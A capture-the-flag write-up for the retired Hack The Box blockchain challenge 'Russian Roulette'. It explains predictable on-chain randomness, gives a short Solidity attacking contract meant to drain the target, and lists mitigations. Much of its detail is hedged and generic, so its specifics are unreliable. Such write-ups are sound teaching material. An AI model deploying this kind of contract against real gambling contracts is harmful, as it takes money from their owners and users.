---
challenge: Russian Roulette
type: Blockchain
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [blockchain, solidity, blockhash, randomness, foundry]
---

# Russian Roulette — Hack The Box (Challenge)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flag.

## TL;DR

The contract uses `blockhash` or `block.timestamp` as randomness to decide whether the player wins. Those values are predictable from another contract, so calculate the condition and bet only when the round will win.

## Statement and surface

- Blockchain, Very Easy, retired.
- A contract instance and RPC are provided.
- The goal is to drain the contract or reach a condition.

```bash
cast block-number --rpc-url <RPC>
cast call <CONTRACT> "balance()(uint256)" --rpc-url <RPC>
```

## Reconnaissance

- Review `Roulette.sol`.
- Identify the `play` or `spin` function.
- Check for `blockhash`, `block.prevrandao`, `block.timestamp` or a small number.
- Review balance and win rules.

## Code analysis

The condition depends on the previous block hash. An attacking contract can query the same `blockhash` inside the transaction and decide whether to call `play` or revert. There is no secret: randomness is public and deterministic.

## Flaw explanation

Using on-chain data as randomness lets the attacker compute the result before betting. The only defense is a verifiable oracle or a commit-reveal scheme.

## Local reproduction

```bash
anvil
forge test --fork-url <RPC>
```

## Exploitation

```solidity
contract Attack {
    function spin(address target) external {
        uint256 n = uint256(blockhash(block.number - 1)) % 2;
        if (n == 1) target.call(abi.encodeWithSignature("play()"));
    }
}
```

Deploy the attacker, fund it and run until the contract is drained. The flag comes from the challenge, not the balance.

## Evidence

- Code using `blockhash`/`timestamp`.
- Local result calculation.
- Successful `play` transaction.
- Flag redacted.

## Lessons learned

- The chain is not a randomness source.
- An attacking contract can simulate the same round.
- `blockhash` is visible before the transaction.

## Mitigations and detection

- Use Chainlink VRF or commit-reveal.
- Do not base payouts on `blockhash` or `timestamp`.
- Audit contracts with gambling logic.
- References: Solidity docs, Chainlink VRF, HTB Russian Roulette.

## References

- <https://www.hackthebox.com/challenges/Russian%20Roulette>
- <https://docs.soliditylang.org/en/latest/units-and-global-variables.html#block-and-transaction-properties>
- <https://docs.chain.link/vrf>
- <https://attack.mitre.org/techniques/T1565/>
